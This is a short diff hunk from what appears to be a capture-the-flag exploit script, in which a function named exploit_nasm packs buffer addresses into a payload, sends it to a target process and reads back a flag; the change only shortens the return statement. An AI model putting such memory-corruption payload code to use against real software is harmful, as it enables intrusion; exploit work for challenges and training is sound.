@@ -61,8 +61,7 @@ def exploit_nasm(flagfile):
     sploit += pack(buffer_address+len(flagfile)+1)
 
     p.send(sploit)
-    flag = p.recvline()
-    return flag
+    return p.recvline()
 
 # Second example
 flag = exploit_nasm(args['FLAG'])
